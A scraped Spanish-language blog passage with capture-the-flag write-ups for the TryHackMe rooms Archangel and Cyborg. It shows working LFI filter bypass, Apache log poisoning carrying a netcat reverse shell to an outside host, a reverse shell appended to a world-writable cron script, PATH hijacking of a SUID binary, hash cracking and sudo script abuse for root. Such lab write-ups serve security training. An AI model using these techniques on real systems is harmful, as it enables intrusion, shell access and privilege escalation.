/\\_\\/ / /\\ \\__ /\\__ \\ / /\\ \\ \\ / /\\ \\ \\ / / /\\ \\_\\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\ \\ \\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\_\\ / / /\\ \\_\\ / / /_/ / /\\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ / /\\ \\_\\ \\ \\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ /_/_ \\/_/ / / /_/ / / / / /__\\/ / / / / / / / \\ \\ \\ / / / \\/_/ / /\\ \\ \\___\\ / / / / / / \\ \\ \\ / / / \\/_/ /____/\\ / / /__\\/ / / / /_____/ / / / / / _ \\ \\ \\ / / / / / / \\ \\ \\__// / / / / _ \\ \\ \\ / / / / /\\____\\/ / / /_____/ / / /\\ \\ \\ / / /___/ / /_/\\__/ / / / / / / / /____\\_\\ \\ / / /___/ / /_/\\__/ / / / / / / / /______ / / /\\ \\ \\ / / / \\ \\ \\/ / /____\\/ /\\ \\/___/ / /_/ / / / /__________/ / /____\\/ /\\ \\/___/ / /_/ / / / /_______/ / / \\ \\ \\ \\/_/ \\_\\/\\/_________/ \\_____\\/ \\_\\/ \\/_____________\\/_________/ \\_____\\/ \\_\\/ \\/__________\\/_/ \\_\\/ [?] Started at\t: 2021-02-04 19:17:52 GET\t403 Forbidden\thttp://mafialive.thm/.php GET 200 OK http://mafialive.thm/ GET 200 OK http://mafialive.thm/index.html GET 200 OK http://mafialive.thm/robots.txt GET 403 Forbidden http://mafialive.thm/server-status GET 200 OK http://mafialive.thm/test.php [?] Ended at: 2021-02-04 19:23:171 LFI - WWW-DATA (USER) En la pagina test.php vemos que existe una vulnerabilidad LFI ya que se le esta pasando al parametro view la direccion completa del archivo a mostrar en la pagina.\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;INCLUDE\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Test Page. Not to be Deployed\u0026lt;/h1\u0026gt; \u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;/test.php?view=/var/www/html/development_testing/mrrobot.php\u0026#34;\u0026gt;\u0026lt;button id=\u0026#34;secret\u0026#34;\u0026gt;Here is a button\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt; Control is an illusion \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Utilizamos un filtro de PHP para leer y codificar en base64 el archivo test.php con lo que obtuvimos el codigo fuente codificado y al decodificarlo encontramos nuestra segunda flag. Vemos en el codigo que el parametro que se le pase a view debe de tener el string /var/www/html/development_testing y este no debe de contener ../.. por lo que no podriamos leer algun archivo en otra direccion y es necesario buscar y realizar bypas a esta condicional. Para poder hacer un \u0026ldquo;bypass\u0026rdquo; a esta pequeña condicional se incluye la direccion /var/www/html/development_testing dentro de un filtro lo cual nos permitiria leer cualquier archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php [... REDACTED ...]\t\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;/test.php?view=/var/www/html/development_testing/mrrobot.php\u0026#34;\u0026gt;\u0026lt;button id=\u0026#34;secret\u0026#34;\u0026gt;Here is a button\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt; \u0026lt;?php //FLAG: thm{[... REDACTED ...]} function containsStr($str, $substr) { return strpos($str, $substr) !== false; } if(isset($_GET[\u0026#34;view\u0026#34;])){ if(!containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;../..\u0026#39;) \u0026amp;\u0026amp; containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;/var/www/html/development_testing\u0026#39;)) { include $_GET[\u0026#39;view\u0026#39;]; }else{ echo \u0026#39;Sorry, Thats not allowed\u0026#39;; } }\t?\u0026gt; [... REDACTED ...] El filtro quedaria de la siguiente forma php://filter//var/www/html/development_testing/resource=/etc/passwd lo cual nos permite leer el archivo /etc/passwd.\nLogramos tambien leer nuestra flag user.txt.\nRealizamos una enumeracion de archivos pero no encontramos alguna contraseña, verificamos que tuvieramos acceso a los logs de acceso de apache (/var/log/apache2/acess.log) logramos leer dicho archivo.\n1 10.2.29.162 - - [05/Feb/2021:08:07:19 +0530] \u0026#34;GET /robots.txt HTTP/1.1\u0026#34; 404 455 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\u0026#34; 10.2.29.162 - - [05/Feb/2021:08:07:22 +0530] \u0026#34;GET /test.php?view=/var/www/html/development_testing/../../../../../../log/apache2/access.log HTTP/1.1\u0026#34; 200 559 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\u0026#34; 10.2.29.162 - - [05/Feb/2021:08:07:38 +0530] \u0026#34;GET /test.php?view=/var/www/html/development_testing/..///////..////..//////..///////..////..///////var/log/apache2/access.log HTTP/1.1\u0026#34; 200 606 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\u0026#34; Ya que tenemos acceso a este archivo podemos verificar que sea posible ejecutar codigo para ello realizamos una prueba con phpinfo() enviandolo a travez de una solicitud GET, al revisar el archivo access.log logramos ver que se ejecuto dicha funcion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 kali@kali:~/thm/archangel$ nc mafialive.thm 80 GET /\u0026lt;?php phpinfo(); ?\u0026gt; HTTP/1.1 400 Bad Request Date: Fri, 05 Feb 2021 00:54:45 GMT Server: Apache/2.4.29 (Ubuntu) Content-Length: 301 Connection: close Content-Type: text/html; charset=iso-8859-1 \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;400 Bad Request\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Bad Request\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Your browser sent a request that this server could not understand.\u0026lt;br /\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.29 (Ubuntu) Server at localhost Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; Sabiendo esto podemos realizar Log Poisoning enviando codigo php para ejecucion de comandos en una peticion GET y al realizar la lectura del log el codigo se ejecutaría. Existen varias formas de ejecutar comandos se muestra: link se muestra \u0026lt;?php system($_GET['cmd']); \u0026gt; aunque es necesario pasar el comando en el parametro cmd al realizar la lectura. Al intentar con varias funciones solo una funcionó, exec ya que las demás no dejaban que realizaramos la lectura del archivo access.log. El codigo enviado fue el siguiente: \u0026lt;?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.10.10 1338 \u0026gt;/tmp/f') ?\u0026gt; con el cual logramos obtener una shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 kali@kali:~/thm/archangel$ nc mafialive.thm 80 GET /\u0026lt;?php exec(\u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.2.29.162 1338 \u0026gt;/tmp/f\u0026#39;) ?\u0026gt; HTTP/1.1 400 Bad Request Date: Fri, 05 Feb 2021 02:53:46 GMT Server: Apache/2.4.29 (Ubuntu) Content-Length: 301 Connection: close Content-Type: text/html; charset=iso-8859-1 \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;400 Bad Request\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Bad Request\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Your browser sent a request that this server could not understand.\u0026lt;br /\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.29 (Ubuntu) Server at localhost Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; ARCHANGEL - USER Realizamos una enumeracion en la maquina y encontramos en el archivo crontab un script el cual es ejecutado por archangel, dicho archivo tiene permisos de escritura, lectura y ejecucion para todos los usuarios y se ejecuta cada minuto. Agregamos una shell inversa al script y logramos obtener una shell con este usuario y nuestra segunda flag user2.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 www-data@ubuntu:/$ cat /etc/crontab [... REDACTED ...] # m h dom mon dow user\tcommand */1 * * * * archangel /opt/helloworld.sh 17 *\t* * *\troot cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) # www-data@ubuntu:/$ cat /opt/helloworld.sh cat /opt/helloworld.sh #!/bin/bash echo \u0026#34;hello world\u0026#34; \u0026gt;\u0026gt; /opt/backupfiles/helloworld.txt www-data@ubuntu:/$ ls -lah /opt/helloworld.sh ls -lah /opt/helloworld.sh -rwxrwxrwx 1 archangel archangel 66 Nov 20 10:35 /opt/helloworld.sh www-data@ubuntu:/$ echo \u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.2.29.162 1339 \u0026gt;/tmp/f\u0026#39; \u0026gt;\u0026gt; /opt/helloworld.sh \u0026lt;|nc 10.2.29.162 1339 \u0026gt;/tmp/f\u0026#39; \u0026gt;\u0026gt; /opt/helloworld.sh www-data@ubuntu:/$ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 archangel@ubuntu:~$ ls -lah ls -lah total 48K drwxr-xr-x 7 archangel archangel 4.0K Feb 5 08:38 . drwxr-xr-x 3 root root 4.0K Nov 18 13:06 .. -rw-r--r-- 1 archangel archangel 220 Nov 18 00:48 .bash_logout -rw-r--r-- 1 archangel archangel 3.7K Nov 18 00:48 .bashrc drwx------ 2 archangel archangel 4.0K Nov 18 13:08 .cache drwxrwxr-x 3 archangel archangel 4.0K Nov 18 11:20 .local drwxr-xr-x 2 archangel archangel 4.0K Nov 18 01:36 myfiles -rw-r--r-- 1 archangel archangel 807 Nov 18 00:48 .profile drwxrwx--- 2 archangel archangel 4.0K Nov 19 20:41 secret -rw-rw-r-- 1 archangel archangel 66 Nov 18 11:20 .selected_editor drwx------ 2 archangel archangel 4.0K Feb 5 08:39 .ssh -rw-r--r-- 1 archangel archangel 26 Nov 19 19:57 user.txt archangel@ubuntu:~$ cd secret cd secret archangel@ubuntu:~/secret$ ls -lah ls -lah total 32K drwxrwx--- 2 archangel archangel 4.0K Nov 19 20:41 . drwxr-xr-x 7 archangel archangel 4.0K Feb 5 08:38 .. -rwsr-xr-x 1 root root 17K Nov 18 16:40 backup -rw-r--r-- 1 root root 49 Nov 19 20:41 user2.txt archangel@ubuntu:~/secret$ cat user2.txt cat user2.txt thm{[... REDACTED ...]} archangel@ubuntu:~/secret$ PRIVILEGE ESCALATION Hacemos una pequeña enumeracion en busqueda de ejecutables con permisos SUID, logramos encontrar un archivo (backup) el cual realiza una copia de todos los archivos de la carpeta myfiles hacia /opt/backupfiles, lo que no se toma en cuenta en el codigo es la direccion completa de cp, por lo que podriamos modificar la variable $PATH para que tome otro ejecutable llamado cp antes que el original (/bin/cp).\nbash\rc\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 archangel@ubuntu:~/secret$ find / -perm -4000 2\u0026gt;/dev/null |xargs ls -lah -rwsr-xr-x 1 root root 31K Aug 11 2016 /bin/fusermount -rwsr-xr-x 1 root root 43K Sep 17 00:13 /bin/mount -rwsr-xr-x 1 root root 63K Jun 28 2019 /bin/ping -rwsr-xr-x 1 root root 44K Mar 23 2019 /bin/su -rwsr-xr-x 1 root root 27K Sep 17 00:13 /bin/umount -rwsr-xr-x 1 root root 17K Nov 18 16:40 /home/archangel/secret/backup -rwsr-xr-x 1 root root 75K Mar 23 2019 /usr/bin/chfn -rwsr-xr-x 1 root root 44K Mar 23 2019 /usr/bin/chsh -rwsr-xr-x 1 root root 75K Mar 23 2019 /usr/bin/gpasswd -rwsr-xr-x 1 root root 40K Mar 23 2019 /usr/bin/newgrp -rwsr-xr-x 1 root root 59K Mar 23 2019 /usr/bin/passwd -rwsr-xr-x 1 root root 146K Sep 23 20:29 /usr/bin/sudo -rwsr-xr-x 1 root root 19K Jun 28 2019 /usr/bin/traceroute6.iputils -rwsr-xr-- 1 root messagebus 42K Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 427K Mar 4 2019 /usr/lib/openssh/ssh-keysign archangel@ubuntu:~/secret$ which cp which cp /bin/cp archangel@ubuntu:~/secret$ echo $PATH echo $PATH /usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin archangel@ubuntu:~/secret$ 1 2 3 4 5 6 7 8 undefined8 main(void) { setuid(0); setgid(0); system(\u0026#34;cp /home/user/archangel/myfiles/* /opt/backupfiles\u0026#34;); return 0; } Creamos un script para que ejecute bash con el nombre cp y le damos permisos de ejecucion, tambien agregamos al inicio la direccion /home/archangel/secret a la variable PATH.\n1 2 3 4 5 6 7 8 9 10 archangel@ubuntu:~/secret$ echo \u0026#34;/bin/bash\u0026#34; \u0026gt; cp echo \u0026#34;/bin/bash\u0026#34; \u0026gt; cp archangel@ubuntu:~/secret$ chmod +x cp chmod +x cp archangel@ubuntu:~/secret$ export PATH=/home/archangel/secret/:$PATH export PATH=/home/archangel/secret/:$PATH archangel@ubuntu:~/secret$ echo $PATH echo $PATH /home/archangel/secret/:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin archangel@ubuntu:~/secret$ Ejecutamos el archivo /home/archangel/secret/backup, logramos obtener una shell con usuario root y la flag root.txt.\n","description":"Archangel es una maquina de TryHackMe, presenta una vulnerabilidad LFI y mediante envenenamiento de log obtuvimos acceso a la maquina. Modificamos un script que es ejecutado por un cron para realizar movimiento lateral. Finalmente un archivo con permisos SUID y la lectura de su codigo fuente permitió que ejecutaramos bash como root.","id":75,"section":"posts","tags":["lfi","lfi log poisoning","rce","suid","ghidra"],"title":"TryHackMe - Archangel","uri":"https://sckull.github.io/posts/archangel/"},{"content":"\rCyborg es una maquina de TryHackMe, encontramos un backup creado con Borg, obtuvimos la contraseña enumerando la pagina web, dentro del backup encontramos las credenciales las cuales utilizamos en SSH. Para escalar privilegios analizamos un script el cual nos permitio dar permisos SUID a bash.\nRoom Titulo Cyborg Descripción A box involving encrypted archives, source code analysis and more. Puntos 300 Dificultad Facil Maker fieldraccoon NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 # Nmap 7.80 scan initiated Thu Feb 4 13:54:10 2021 as: nmap --min-rate 1000 -p- -T4 -oN portScan cyborg.thm Warning: 10.10.158.178 giving up on port because retransmission cap hit (6). Nmap scan report for cyborg.thm (10.10.158.178) Host is up (0.31s latency). Not shown: 59101 closed ports, 6432 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Thu Feb 4 13:57:01 2021 -- 1 IP address (1 host up) scanned in 171.33 seconds # Nmap 7.80 scan initiated Thu Feb 4 14:11:21 2021 as: nmap -sV -sC -oN serviceScan cyborg.thm Nmap scan report for cyborg.thm (10.10.158.178) Host is up (0.28s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA) | 256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA) |_ 256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Feb 4 14:12:25 2021 -- 1 IP address (1 host up) scanned in 64.42 seconds RUSTBUSTER - HTTP Encontramos el index de apache en el puerto 80, utilizamos rustbuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~ _ _ _ _ _ _ _ _ _ _ /\\ \\ /\\_\\ / /\\ /\\ \\ / /\\ /\\_\\ / /\\ /\\ \\ /\\ \\ /\\ \\ / \\ \\/ / / _ / / \\ \\_\\ \\ / / \\ / / / _ / / \\ \\_\\ \\ / \\ \\ / \\ \\ / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / /\\ \\ \\ / /\\ \\ \\ / / /\\ \\_\\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\ \\ \\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\_\\ / / /\\ \\_\\ / / /_/ / /\\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ / /\\ \\_\\ \\ \\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ /_/_ \\/_/ / / /_/ / / / / /__\\/ / / / / / / / \\ \\ \\ / / / \\/_/ / /\\ \\ \\___\\ / / / / / / \\ \\ \\ / / / \\/_/ /____/\\ / / /__\\/ / / / /_____/ / / / / / _ \\ \\ \\ / / / / / / \\ \\ \\__// / / / / _ \\ \\ \\ / / / / /\\____\\/ / / /_____/ / / /\\ \\ \\ / / /___/ / /_/\\__/ / / / / / / / /____\\_\\ \\ / / /___/ / /_/\\__/ / / / / / / / /______ / / /\\ \\ \\ / / / \\ \\ \\/ / /____\\/ /\\ \\/___/ / /_/ / / / /__________/ / /____\\/ /\\ \\/___/ / /_/ / / / /_______/ / / \\ \\ \\ \\/_/ \\_\\/\\/_________/ \\_____\\/ \\_\\/ \\/_____________\\/_________/ \\_____\\/ \\_\\/ \\/__________\\/_/ \\_\\/ [?] Started at\t: 2021-02-04 14:13:58 GET\t200 OK\thttp://cyborg.thm/ GET 301 Moved Permanently http://cyborg.thm/admin =\u0026gt; http://cyborg.thm/admin/ GET 301 Moved Permanently http://cyborg.thm/etc =\u0026gt; http://cyborg.thm/etc/ GET 200 OK http://cyborg.thm/index.html GET 403 Forbidden http://cyborg.thm/server-status [?] Ended at: 2021-02-04 14:22:05 Encontramos una pagina web que parece ser estatica, además vemos un nombre Alex (posible usuario) en la descripcion de Setup.\nBORG \u0026gt; ALEX (USER) Encontramos lo que parece ser un chat en la pagina donde vemos dos nuevos nombres Josh, Adam, y donde Alex menciona sobre algun tipo de proxy y que tiene un backup en music_archive.\nAdemás vemos un archivo tar en el menu Archive \u0026gt; Download, el cual descargamos y analizamos. Encontramos archivos los cuales parecen ser archivos creados con BorgBackup, pero al intentar obtener estos archivos borg pide una frase la cual no tenemos por ahora.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 kali@kali:~/thm/cyborg$ tar -xvf archive.tar home/field/dev/final_archive/ home/field/dev/final_archive/hints.5 home/field/dev/final_archive/integrity.5 home/field/dev/final_archive/config home/field/dev/final_archive/README home/field/dev/final_archive/nonce home/field/dev/final_archive/index.5 home/field/dev/final_archive/data/ home/field/dev/final_archive/data/0/ home/field/dev/final_archive/data/0/5 home/field/dev/final_archive/data/0/3 home/field/dev/final_archive/data/0/4 home/field/dev/final_archive/data/0/1 kali@kali:~/thm/cyborg/home/field/dev/final_archive$ file * config: ASCII text data: directory hints.5: data index.5: data integrity.5: data nonce: ASCII text, with no line terminators README: ASCII text kali@kali:~/thm/cyborg/home/field/dev/final_archive$ cat README This is a Borg Backup repository. See https://borgbackup.readthedocs.io/ kali@kali:~/thm/cyborg/home/field/dev/final_archive$ Anteriormente Rustubuster encontro un directorio (/etc/) al cual se le realizó una busqueda nueva, donde encontramos un nuevo directorio que contiene un archivo con una contraseña y un archivo de configuracion de lo que parece ser un \u0026ldquo;proxy\u0026rdquo;. Utilizamos John para obtener la contraseña en texto plano.\nbash\rbash\rbash\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~ _ _ _ _ _ _ _ _ _ _ /\\ \\ /\\_\\ / /\\ /\\ \\ / /\\ /\\_\\ / /\\ /\\ \\ /\\ \\ /\\ \\ / \\ \\/ / / _ / / \\ \\_\\ \\ / / \\ / / / _ / / \\ \\_\\ \\ / \\ \\ / \\ \\ / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / /\\ \\ \\ / /\\ \\ \\ / / /\\ \\_\\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\ \\ \\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\_\\ / / /\\ \\_\\ / / /_/ / /\\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ / /\\ \\_\\ \\ \\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ /_/_ \\/_/ / / /_/ / / / / /__\\/ / / / / / / / \\ \\ \\ / / / \\/_/ / /\\ \\ \\___\\ / / / / / / \\ \\ \\ / / / \\/_/ /____/\\ / / /__\\/ / / / /_____/ / / / / / _ \\ \\ \\ / / / / / / \\ \\ \\__// / / / / _ \\ \\ \\ / / / / /\\____\\/ / / /_____/ / / /\\ \\ \\ / / /___/ / /_/\\__/ / / / / / / / /____\\_\\ \\ / / /___/ / /_/\\__/ / / / / / / / /______ / / /\\ \\ \\ / / / \\ \\ \\/ / /____\\/ /\\ \\/___/ / /_/ / / / /__________/ / /____\\/ /\\ \\/___/ / /_/ / / / /_______/ / / \\ \\ \\ \\/_/ \\_\\/\\/_________/ \\_____\\/ \\_\\/ \\/_____________\\/_________/ \\_____\\/ \\_\\/ \\/__________\\/_/ \\_\\/ [?] Started at : 2021-02-04 15:29:29 GET 200 OK http://cyborg.thm/etc/ GET 403 Forbidden http://cyborg.thm/etc/.html GET 301 Moved Permanently http://cyborg.thm/etc/squid =\u0026gt; http://cyborg.thm/etc/squid/ [... REDACTED ...] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # HASH # music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn. kali@kali:~/thm/cyborg$ john hash --wordlist=/usr/share/wordlists/rockyou.txt Warning: detected hash type \u0026#34;md5crypt\u0026#34;, but the string is also recognized as \u0026#34;md5crypt-long\u0026#34; Use the \u0026#34;--format=md5crypt-long\u0026#34; option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3]) Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status [... REDACTED ...] (music_archive) 1g 0:00:00:00 DONE (2021-02-04 15:45) 4.347g/s 169460p/s 169460c/s 169460C/s 112806..samantha5 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed kali@kali:~/thm/cyborg$ 1 2 3 4 5 6 7 #squid.conf auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd auth_param basic children 5 auth_param basic realm Squid Basic Authentication auth_param basic credentialsttl 2 hours acl auth_users proxy_auth REQUIRED http_access allow auth_users Configuramos la contraseña encontrada como frase de BORG, listamos los archivos en el repositorio y encontramos music_archive el cual logramos extraer. El backup music_archive pertenece a la carpeta principal de alex donde encontramos su usuario y contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 kali@kali:~/thm/cyborg/home/field/dev/final_archive$ export BORG_PASSPHRASE=\u0026#39;[... REDACTED ...]\u0026#39; kali@kali:~/thm/cyborg/home/field/dev/final_archive$ /home/kali/tools/borg/borg-linux64 list . music_archive Tue, 2020-12-29 09:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82] kali@kali:~/thm/cyborg/home/field/dev/final_archive$ /home/kali/tools/borg/borg-linux64 extract .::music_archive kali@kali:~/thm/cyborg/home/field/dev/final_archive$ tree home/ home/ └── alex ├── Desktop │ └── secret.txt ├── Documents │ └── note.txt ├── Downloads ├── Music ├── Pictures ├── Public ├── Templates └── Videos 9 directories, 2 files kali@kali:~/thm/cyborg/home/field/dev/final_archive$ cat home/alex/Documents/note.txt Wow I\u0026#39;m awful at remembering Passwords so I\u0026#39;ve taken my Friends advice and noting them down! alex:[... REDACTED ...] kali@kali:~/thm/cyborg/home/field/dev/final_archive$ Utilizando dichas credenciales en el servicio SSH logramos obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos sudo (root) para ejecutar el script /etc/mp3backups/backup.sh. Dicho script realiza una busqueda de archivos mp3 los cuales se escriben en un archivo, tambien realiza un backup de los archivos descritos en la variable backup_files utilizando tar, además de eso durante su ejecucion verifica las \u0026ldquo;flags\u0026rdquo; que se le pasan al script en este caso seria -c utilizando getopts y al finalizar se ejecuta los parametros/comandos que se le pasan a -c, es decir /etc/mp3backups/backup.sh -c COMANDO.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #!/bin/bash sudo find / -name \u0026#34;*.mp3\u0026#34; | sudo tee /etc/mp3backups/backed_up_files.txt input=\u0026#34;/etc/mp3backups/backed_up_files.txt\u0026#34; #while IFS= read -r line #do #a=\u0026#34;/etc/mp3backups/backed_up_files.txt\u0026#34; # b=$(basename $input) #echo # echo \u0026#34;$line\u0026#34; #done \u0026lt; \u0026#34;$input\u0026#34; while getopts c: flag do case \u0026#34;${flag}\u0026#34; in c) command=${OPTARG};; esac done backup_files=\u0026#34;/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3\u0026#34; # Where to backup to. dest=\u0026#34;/etc/mp3backups/\u0026#34; # Create archive filename. hostname=$(hostname -s) archive_file=\u0026#34;$hostname-scheduled.tgz\u0026#34; # Print start status message. echo \u0026#34;Backing up $backup_files to $dest/$archive_file\u0026#34; echo # Backup the files using tar. tar czf $dest/$archive_file $backup_files # Print end status message. echo echo \u0026#34;Backup finished\u0026#34; cmd=$($command) echo $cmd Realizamo la ejecucion de bash (-c bash) pero la shell esta obsoleta, al ejecutar varios comandos no se muestran, solo lo hacen al salir de la shell. Por lo que le dimos permisos SUID a /bin/bash, luego de esto ejecutamos bash -p con el usuario Alex, lo que nos permitio obtener una shell root y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c \u0026#39;chmod u+s /bin/bash\u0026#39; /home/alex/Music/image12.mp3 [... REDACTED ...] Backup finished alex@ubuntu:~$ bash -p bash-4.3# whoami; id; pwd root uid=1000(alex) gid=1000(alex) euid=0(root) groups=1000(alex),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) /home/alex bash-4.3# exit exit alex@ubuntu:~$ bash -p bash-4.3# ls /root root.txt bash-4.3# cd /root bash-4.3# ls -lah total 36K drwx------ 4 root root 4.0K Dec 30 02:27 . drwxr-xr-x 24 root root 4.0K Dec 30 13:36 .. -rw------- 1 root root 2.9K Dec 31 10:50 .bash_history -rw-r--r-- 1 root root 3.1K Oct 22 2015 .bashrc drwx------ 2 root root 4.0K Aug 6 15:50 .cache drwxr-xr-x 2 root root 4.0K Dec 30 01:42 .nano 